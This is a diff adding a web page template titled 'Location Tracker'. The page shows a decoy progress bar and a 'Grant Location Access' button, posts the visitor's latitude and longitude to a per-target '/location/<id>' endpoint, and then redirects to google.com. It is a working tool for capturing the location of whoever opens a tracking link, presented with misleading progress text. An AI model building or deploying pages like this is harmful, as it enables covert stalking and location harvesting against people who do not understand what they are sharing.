@@ -1,0 +1,103 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Tracker</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: #000;
+      color: #ff0000;
+      font-family: monospace;
+      margin: 0;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .progress {
+      width: 200px;
+      height: 20px;
+      background: #1a1a1a;
+      border: 2px solid #ff0000;
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 20px 0;
+    }
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      background: #ff0000;
+      box-shadow: 0 0 10px #ff0000;
+      transition: width 0.5s;
+    }
+    .status {
+      font-size: 18px;
+      margin: 10px 0;
+      text-shadow: 0 0 5px #ff0000;
+    }
+    .location-btn {
+      padding: 15px 30px;
+      background: rgba(255, 0, 0, 0.2);
+      border: 2px solid #ff0000;
+      color: #ff0000;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+      border-radius: 5px;
+      text-shadow: 0 0 5px #ff0000;
+    }
+  </style>
+</head>
+<body>
+  <div class="progress">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+  <div class="status" id="status">Initializing...</div>
+  <button class="location-btn" onclick="requestLocation()">Grant Location Access</button>
+
+  <script>
+    let progress = 0;
+    const progressBar = document.getElementById('progressBar');
+    const statusText = document.getElementById('status');
+    
+    function updateProgress() {
+      if (progress < 200) {
+        progress += 2;
+        progressBar.style.width = (progress / 2) + '%';
+        statusText.textContent = `Processing: ${progress}%`;
+        setTimeout(updateProgress, 50);
+      }
+    }
+
+    async function requestLocation() {
+      try {
+        updateProgress();
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+        
+        const response = await fetch('/location/<%= id %>', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          })
+        });
+        
+        if (response.ok) {
+          statusText.textContent = 'Location tracked successfully';
+          setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+          }, 1000);
+        }
+      } catch (error) {
+        statusText.textContent = 'Error tracking location';
+      }
+    }
+  </script>
+</body>
+</html>
